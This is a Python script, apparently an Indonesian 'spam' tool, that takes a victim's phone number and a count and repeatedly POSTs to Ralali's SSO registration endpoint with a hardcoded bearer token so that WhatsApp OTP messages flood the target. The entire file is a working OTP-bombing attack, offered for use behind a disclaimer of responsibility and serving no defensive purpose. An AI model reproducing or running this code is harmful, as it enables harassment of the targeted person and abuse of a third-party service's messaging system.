#module
import requests,json,os
import random
import sys
import time
os.system("clear")

logo="""
                           					\33[0;36mv1.1
      \33[0;31m00000000     0000000000       0000      000      000
      \33[0;31m00000000     00000000000     000000     000      000
      \33[0;31m000          000     000    000  000    000 0  0 000
      \33[0;31m00000000     000     000   000    000   000  00  000
      \33[0;37m00000000     00000000000   0000000000   000      000
           \33[0;37m000     0000000000    0000000000   000      000
     \33[0;37m000000000     000		 000    000   000      000
     \33[0;37m000000000     000           000    000   000      000

"""
baner="""
 \33[0;34m=============================================
\t\33[0;35m[+] \33[0;33mAUTHOR : AmjadOficial
\t\33[0;35m[+] \33[0;36mYOUTUBE: AmjadOficial
\t\33[0;35m[+] \33[0;37mGithub : AmjafOficial
 \33[0;34m=============================================
"""

print(logo)
print(baner)

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.3)
mengetik("\33[0;31mAdmin tidak bertanggung jawab jika ada masalah!!!")


print("\33[0;35mcontoh :> 8xxxxxxx")
no = input("\33[0;33mNomor Target     :>\33[0;32m")
jum = int(input("\33[0;33mJumlah spam :>\33[0;32m "))

head ={
"Host":"access.ralali.com",
"content-length":"110",
"authorization":"Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOjEwMDAwLCJ0b2tlbl92ZXJzaW9uIjoiMS4wLjAiLCJ0b2tlbl90eXBlIjoiZ3Vlc3RfdG9rZW4iLCJhdWQiOiIxMiIsImV4cCI6MTY5NTA0ODEwMywianRpIjoiYzRhZmQyZjMtMGI1My0yYTg4LTY5N2EtMDkyN2Y4NDliMjJkIiwiaWF0IjoxNjk0OTYxNzAzLCJpc3MiOiIvZXgvdjEvYXV0aG9yaXplIn0.ZoSaaH0ZHCs0fC6gW8o3KuH4Hin24wxBTsnqR9yEJ21l-xSQYrs513E9WuG_6j13fF1DY53lFmDmezYAFn7rRUV3me3JNQhaeTOr1L2jG4tknV4v9RFr3zXhYeq_900HJFdxHTvxDbDKB517Lhu2y8RYCVfiagfh09zEaUCB-EMplK4yAQkWMlrVo2eLMEpXPosc-GLMQ-jVUxw7h3FefHUq29jRfSkYrwLZlkKGr6uMfcG_rlXh_QcfKuStFRVb8WUVp_KRGtMGLXntM3FNmIN-ejJNSD6_25XCjogzaQLURc0Elia9OLyXkI6Bv4ev9poiJK2gDHSNR1dj2eqpYA",
"user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"content-type":"application/json",
"accept":"application/json",
"x-lang":"id",
"sec-ch-ua-platform":"Android",
"origin":"https://www.ralali.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://www.ralali.com/",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}

data = json.dumps({"sso_code":"sso-ralali-group","otp_channel":"whatsapp","validate_by":"+62" +no,"name":"Solihul amjad"})
for i in range(jum):
  pos = requests.post("https://access.ralali.com/sso/v1/register",headers=head,data=data).text
  if "Sukses" in pos:
    print("\33[0;32m[✓]Berhasil")
  else:
    print("\33[0;31m[x]Gagal")


